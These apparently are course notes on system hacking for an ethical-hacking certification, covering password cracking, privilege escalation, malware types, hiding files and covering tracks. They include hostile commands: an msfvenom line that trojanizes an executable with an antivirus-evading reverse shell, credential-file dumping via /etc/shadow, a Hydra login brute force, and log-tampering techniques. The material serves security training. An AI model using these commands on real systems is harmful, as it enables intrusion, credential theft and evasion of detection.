Module 6: System Hacking

Section 1: Password Cracking Overview

Password cracking = recovering passwords from transmitted or stored data on computer systems.

Password Attack Types

Non-Electronic Attacks

  • Dumpster diving: Looking for notes or anything that can help in cracking the password
  • Shoulder surfing: Observing the target while they type their passwords (looking at keyboard or screen)
  • Social engineering: Interacting with the target to trick them into revealing passwords

Active Online Attacks

Require the attacker to communicate with the target machine to crack the password. E.g., trying to login with username-password combinations on an online login page.

  • Network communication to server over internet takes long time
  • Rate limits exist (locked after 5 min, then 10, then 15)
  • If server detects a bot, it may shut you off directly
  • Offline attacks can perform millions/billions per second vs. online attacks (~every 5 seconds with lockout risk)

Passive Online Attacks

Grabbing data in-transit (e.g., a key, password hash) without communicating with the target machine.

  1. Attacker monitors the communication channel
  2. Records the traffic data
  3. Uses the data to break into the system

Offline Attacks

Cracking efforts on a separate system where the attacker never attempts to login to the application server. Does not mean disconnected from internet. Usually the attacker tries to guess a password from a hash dump (e.g., SAM file on Windows or /etc/shadow on Linux).

Section 2: Online Attack Techniques

Dictionary Attack

Dictionary = file containing list of passwords. Steps: Load a dictionary file into a password cracking program, then the program checks passwords against user accounts.

  • Helps test against default passwords, common/weak passwords, and leaks downloaded from internet
  • Can get too big; no guarantee to find the password

Brute-Force Attack

Running every combination of characters until the password is cracked. Slowest technique but comprehensive. Should be used in combination with rule-based attack to increase speed.

Hybrid Attack

Dictionary attack + brute force attack. Taking a dictionary and expanding it with guesses using brute-force (prepends, appends or substitutes characters in words).

Example using hashcat: If example.dict contains password and hello, then -a 6 example.dict ?d?d would generate from password00 to password99 and hello00 to hello99.

Rule-Based Attack

Used when the attacker has some information about the password (length, digits, etc.). Combines several attacks (brute force, dictionary, syllable attack). Can record people or use other non-electronic attacks to get portions of the password to build rules.

Password Guessing

  1. Find the target's username
  2. Create a password dictionary list (add default passwords from manufacturers)
  3. Sort passwords by probability
  4. Try each password

Trojan/Spyware/Keylogger

Installed in target machine to get passwords and usernames. Run in background and sometimes difficult to detect.

  • Trojans: Designed to collect information or harm the system; allow remote access
  • Spyware: Designed to collect secret information
  • Keyloggers: Send keystrokes to the attacker

Hash Injection

Attack on systems that use hash functions for user authentication.

  1. Retrieve hashes stored in databases
  2. Find the hash belonging to the user
  3. Use that hash to create an authenticated session

LLMNR/NBT-NS Poisoning

LLMNR = Link Local Multicast Name Resolution; NBT-NS = NetBIOS Name Service. Two main Windows OS elements for host name resolution.

  • When DNS fails to resolve name queries, the host sends a UDP broadcast asking hosts to authenticate
  • Attacker listens for broadcasts and tricks the host into establishing a connection
  • Once connected, host sends username and NTLMv2 hash which attacker cracks to discover password

Section 3: Passive & Offline Attack Techniques

Wire Sniffing

Attackers sniff credentials by capturing packets being transmitted. During transmission, attackers capture packets and extract sensitive information such as passwords and emails.

Man-in-the-Middle (MITM) Attack

Attacker gains access to the communication channel between target and server, then extracts information and data to gain unauthorized access.

Replay Attack

Involves using a sniffer to capture packets and authentication tokens. Need access to raw network data via:

  • Network tap to physically copy everything going through the network
  • MITM attack using e.g., ARP poisoning
  • Malware on victim's computer

Attacker replays extracted authentication token or hashed password.

Countermeasure

Using Session ID for each user session on server side; expire session ID in short time intervals so replay attack cannot use same session ID.

Distributed Network Attack (DNA)

Uses the power of machines across the network to decrypt passwords. DNA manager is installed on a central location, coordinating the attack by allocating portions of the key search to machines on the network.

Hash Attacks

  • Rainbow table attack
  • Collision attack
  • Birthday attack
  • Brute-force attack

Section 4: Password Cracking Countermeasures

Password Salting

The longer the random string, the harder it becomes to break or crack the password. Generates different hashes for the same password. Protects against rainbow tables by making the table much bigger.

Key Stretching

Used to derive stronger passwords to use in encryption.

Linux Password Security

Linux hashed passwords lie in /etc/shadow so attackers can target that. Linux usually uses SHA512; you can find the method in /etc/login.defs. In older systems, password information was stored in /etc/passwd, now it holds only user account information.

Section 5: Password Cracking Tools

Crunch

Generates password dictionaries.

crunch <min-length> <max-length> <character-pool> -o <file-name>

Difficulty/time grows exponentially, not linearly. E.g., crunch 4 16 abcekfeafkapeo434@*. generates thousands of petabytes.

John the Ripper (JtR)

Auto-detects OS password based on dictionary or brute-force attacks. Tries different passwords and compares their hashes to OS password. Supports Windows, Linux and macOS.

Usage

  1. Dump OS password to a file: unshadow /etc/passwd /etc/shadow > mypasswd
  2. Crack password file: john mypasswd
  3. Passwords are saved in $JOHN/john.pot. Run john --show mypasswd to see cracked passwords.

Hydra (THC-Hydra)

Fast network login cracker for different protocols such as HTTP, Cisco, MySQL. Supports brute-force and dictionary attacks against SSH, FTP, HTTP, SMB, and many other protocols.

hydra -L usernamelist.txt -P passlist.txt -e ns -F -t 1 -w 10 <host-ip> http-form-post "/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" -v
  • -e ns: Additional options — n try null (empty password), s try same password as username
  • -t 1: Number of tasks (default is 16). Too many connections = detected immediately
  • -w 10: Waiting time of 10 ms
  • Login failed: Text to search in result page to determine whether login has failed

Hashcat

Very fast, GPU-based password cracker with in-kernel rule engine. Can do dictionary hash attack, brute force hash, role based attack and more.

./hashcat64.bin -a 3 -m 1800 ?u?l?l?l?d?d?d
  • -m 1800: Hash mode SHA512crypt (Unix)
  • -a 3 ?u?l?l?l?d?d?d: Mask attack — uppercase + lowercase + lowercase + lowercase + number + number + number

Cain & Abel

Password recovery tool for Windows that can recover passwords by sniffing, brute force, cryptanalysis, and other attacks.

OphCrack

Free Windows password cracker based on rainbow tables. Requires a Windows machine to run the target SAM database dump or the tool directly on the Windows system.

Other Tools

  • Elcomsoft Distributed Password Recovery: Data recovery and password recovery services for Windows. Forensic and government agencies.
  • Passware Kit Forensic: Encrypted electronic evidence discovery and decryption. Can crack passwords for Windows, Unix, Mac OS and many more.
  • chntpw (Offline NT Password & Registry Editor): Linux utility for resetting or blanking local passwords used by Windows.

Section 6: Escalating Privileges

Privilege escalation = exploiting OS and software vulnerabilities to gain admin privileges by executing malicious code that grants higher privileges.

Types

  • Horizontal privilege escalation: Acquiring the privileges of the same level — allows executing files from a protected location
  • Vertical privilege escalation: Acquiring higher privileges

Privilege Escalation Techniques

  • Path Interception: Creating files at paths to be executed instead of legitimate targets (exploits misconfigurations, quotes, search orders)
  • Web Shell: Installed as backdoor to control from a remote server
  • setuid and setgid: Setting them allows executing files with more privileges than user in macOS and Linux

Pivoting

Using a compromised system as a launching point into other systems. E.g., in Metasploit you can add route to first compromised system to access the network beyond it.

Windows Techniques

  • Access token manipulation: Access tokens are used as security context of a process. Users can modify tokens so processes seem to belong another user (e.g., "run as" administrator)
  • File system permissions weakness: Original binaries can be replaced with malicious ones
  • Windows application shimming: Exploiting Windows Application Compatibility Framework to bypass UAC, inject DLLs, capture memory addresses
  • DLL vulnerability: Failure to supply fully qualified path of a DLL — placing a malicious DLL into the execution directory
  • Scheduled tasks: Used to escalate privileges, maintain persistence, start at startup

macOS Techniques

  • Dynamic library vulnerability: Injecting malicious dylibs into primary directories
  • Launch Daemon: Execute malicious files at boot-up time

Meltdown & Spectre Vulnerabilities

  • Meltdown: Affects some Intel chips. Bypasses security mechanisms preventing programs from reading arbitrary memory locations. Allows reading credentials, private keys.
  • Spectre: Affects modern microprocessors. Tricks programs into accessing their memory space. Allows reading kernel memory via JavaScript web-based attacks.

Countermeasures

  • Apply least-privilege: Never grant more privileges than needed!
  • Use encryption and MFA
  • Run services as unprivileged accounts
  • Patch and update regularly
  • Ensure all executables are write-protected

User Access Control (UAC)

Prompts user for potentially dangerous software in Windows. Limits software to user privileges until an administrator authorizes elevation. Should be set to "Always Notify."

Privilege Escalation Tools

  • BeRoot: Check common misconfigurations to find privilege escalation on Linux and Windows
  • linpostexp: Linux post-exploitation enumeration and exploit checking
  • Windows Exploit Suggester and Linux Exploit Suggester

Section 7: Executing Applications

Remotely executing malicious programs designed to steal information, crack passwords, install backdoor, etc. Programs attackers install include:

  • Backdoors: Collect information and gain unauthorized access
  • Crackers: Crack passwords
  • Keyloggers: Record keystrokes
  • Spyware: Capture screenshots

Keylogger

Software or hardware device designed to record every keystroke, log them to a file, and send them to a remote location.

Hardware Keylogger Types

  • PC/BIOS Embedded: Modifying BIOS firmware to capture keystrokes
  • Keylogger keyboard: Hardware circuit attached with keyboard cable connector
  • External keylogger: Placed between keyboard and computer (PS/2, USB, Bluetooth, Wi-Fi)

Software Keylogger Types

  • Application keylogger: Records emails, passwords, messages, browsing activities
  • Kernel keylogger: Exists at kernel level as keyboard device driver
  • Rootkit keylogger: Forged Windows device driver recording keystrokes
  • Device driver keylogger: Replaces the driver with keylogging functionality
  • Hypervisor-based keylogger: Works within a malware hypervisor on the OS
  • Form grabbing keylogger: Records web browsing when Submit event is triggered

Spyware

Stealthy program designed to record the target's interaction with the computer and Internet, send recorded data to the attacker. Able to take and send screenshots.

Types

  • Desktop, Email, Internet, Child-monitoring, Screen-capturing, USB, Audio/video, Print, Telephone, GPS spyware

Section 8: Hiding Files

Rootkits

Create backdoor to the system. Hide themselves by removing from process list, replacing system calls and utilities. Do not spread by themselves — usually hidden in other software.

Rootkit Levels

  • Hypervisor level: Acts as hypervisor and loads target OS as virtual machine
  • Hardware/firmware: Conceals in hardware devices (e.g., motherboard firmware)
  • Kernel level: Replaces portions of OS code or adds malicious core (ring 0)
  • Boot loader level: Replaces original bootloader
  • Application level: Changes behavior of target application
  • Library level: Replaces original system calls to hide attacker's activities

Bootkit

Kernel-mode rootkit that runs every time computer boots. Can bypass code signing by attaching itself to the master boot record (MBR).

NTFS Alternate Data Streams (ADS)

NTFS stores two data streams: file metadata and file data. ADS is not in the file but attached through the Master File Table. Contains metadata such as author, access, word count. Hard to detect because file size and contents remain the same.

GUI Hiding

  • Linux/macOS: Prepend single dot (.) in filenames
  • Windows: Uses hidden file attribute (ATTRIB +H)

Steganography

Technique which hides a message within another message. E.g., an image that is preserved but with embedded data. Used by attackers to hide keyloggers or insert source code for hacking tools.

Steganalysis (Discovering hidden data)

  • Stego only attack: Only the stego-object is available
  • Known stego attack: Algorithm known, both original and stego-object available
  • Known message attack: Hidden message and stego-image are known
  • Known cover attack: Stego-object compared with original cover object
  • Chosen message attack: Generate stego-object from chosen message to find patterns
  • Chosen stego attack: Algorithm and stego-object known

steghide

steghide embed -cf test.jpg -ef hide-me.txt
steghide extract -sf test.jpg

Packing Malware / msfvenom

Embedding malware in other files (PDF, JPEG) to make it hidden. msfvenom combines payload generation and encoding.

msfvenom -a x86 --platform Windows -x /root/Downloads/someProgram.exe -k -p windows/meterpreter/reverse_tcp LHOST=192.168.122.110 LPORT=4444 -e x86/shikata_ga_nai -i 3 -f exe -o program.exe
  • -x: Executable to patch (inject)
  • -k: Keep functionality in the program
  • -p: Payload to inject (reverse shell in example)
  • -e: Encoder to avoid antivirus detection
  • -i 3: Encode 3 times for more stealth

Section 9: Covering Tracks

Attempt to hide attacker's presence on the system so it appears uncompromised. To avoid detection, modify system logs and delete activity during the attack.

Security Logs

Windows Security Logs

Event logs stored in C:\Windows\System32\winevt\Logs. Can use Windows Event Viewer to navigate. Categorized as application, security, and system.

Linux Security Logs

  • /var/log/messages or /var/log/syslog (Debian): Generic system activity
  • /var/log/auth.log (Debian/Ubuntu) | /var/log/secure (RedHat/CentOS): Authentication events
  • /var/log/utmp, /var/log/wtmp, /var/log/btmp, /var/log/faillog: Login/logout events
  • /var/log/lastlog: Last login time
  • /var/log/cron: Cron service logs

Techniques of Covering Tracks

  • Disabling auditing: Disabling logging features (usually requires restart)
  • Clearing logs: Deleting logged activities (suspicious if all logs deleted)
  • Manipulating logs: Changing logs to prevent detection (e.g., search and replace IP)

Covering Tracks on Network

  • Reverse shell: Target system sends request to remote system for commands
  • DNS tunneling: Adding data payload to DNS server to create back channel
  • TCP parameters: Using TCP fields for payload distribution (IP ID, ACK number, sequence number)

Tools for Covering Tracks

  • Privacy.sexy: Online/offline tool to cleanup logs and personal activities
  • Auditpol: Microsoft tool to manipulate audit policies
  • MRU-blaster: Find and remove 30,000 MRU lists

Section 10: Linux Basics for Ethical Hackers

Linux Folder Hierarchy

  • / — Root
  • /var — Variable Data / Log Files
  • /bin — Binaries / User Commands
  • /sbin — Sys Binaries / Admin Commands
  • /root — Home dir for root user
  • /boot — Store kernel
  • /proc — Direct access to kernel
  • /dev — Hardware storage devices
  • /mnt — Mount devices
  • /etc — System configuration files (passwords, firewall settings, hosts file)

File Permissions in Linux

Permissions assigned via binary equivalent for each rwx group: read=4, write=2, execute=1.

Order: First number = user, second = group, third = others. E.g., chmod 744 anyfile allows all privileges to user, read-only for group and others.

Running Processes in Background

Using & runs program in background. Program terminates on logout. Bring back with fg <job-number>.

Essential Linux Commands for Hacking

  • whoami, id, uname -a — System info
  • cat /etc/passwd, cat /etc/shadow — User accounts
  • sudo su — Privilege escalation
  • netstat -tulpn, ss -tulpn — Network connections
  • find / -perm -4000 — Find SUID binaries
  • history — Command history (saved in .bash_history)
  • ps aux — List all processes
  • top or htop — Real-time process viewer
  • grep — Search patterns in files
  • find — Search for files by name/content

Section 11: Microsoft Authentication

Windows stores passwords in hashed form using either:

  • SAM Database: Stored at %SystemRoot%/system32/config/SAM — Locked by kernel, usually stolen via bootable CD/USB
  • Active Directory Database: On domain controller at %SystemRoot%\NTDS\Ntds.dit

NTLM Authentication (New Technology LAN Manager)

Challenge-response authentication protocol. Consists of LM and NTLM protocols. Each stores passwords in SAM using different hash methodologies.

LM Hash (Legacy — Weak)

  • Convert to uppercase, pad to 14 chars with NULL, split into two 7-char chunks
  • Create DES keys, encrypt "KGS!@#$%", concatenate = LM hash
  • Weaknesses: No salting, case-insensitive, max 14 chars, second half always 0xAAD3B435B51404EE if password < 7 chars
  • Cracking: john --format=lm hash.txt or hashcat -m 3000 -a 3 hash.txt

NTLM Hash

Algorithm: MD4(UTF-16-LE(password)). Cracking: john --format=netntlm hash.txt or hashcat -m 5500 -a 3 hash.txt

NTLMv1

  • Uses both NT and LM hash. Deprecated but still used in old systems.
  • Flow: Server sends 8-byte challenge → Client splits NTLM hash into three 7-byte parts → DES encrypt each with challenge → 24-byte response

NTLMv2

  • Uses MD5. Stronger cryptography against spoofing.
  • Flow: Server challenge + Client challenge → HMAC-MD5 hash of NT-hash + username + domain → LMv2 and NTv2 computed → response = LMv2 | CC | NTv2 | CC*
  • Cracking: john --format=netntlmv2 hash.txt or hashcat -m 5600 -a 3 hash.txt

Pass the Hash Attack

Allows gaining access without plaintext password. Exploits static hash shared between sessions. Can dump hashes from compromised machines using Windows Credentials Editor or Pass-the-Hash Toolkit, or sniff the network.

Kerberos Authentication

Network authentication protocol using TCP/UDP port 88. Protects against replay attacks and eavesdropping. Uses symmetric and asymmetric encryption. Mutual authentication via tickets.

Components

  • KDC (Key Distribution Center): Authentication Server (AS) + Ticket Granting Server (TGS)
  • TGT (Ticket Granting Ticket): Encrypted file with limited validity, includes session key and user IP

Kerberos Flow

  1. Client asks KDC for ticket to authenticate
  2. Server responds with secret key (hashed TGT)
  3. TGT sent to server requesting TGS
  4. Server responds with ticket; client accesses network resources

Pass the Ticket Attack

Authentication using Kerberos tickets without password access. Tickets retrieved from memory using tools like mimikatz and Rubeus.
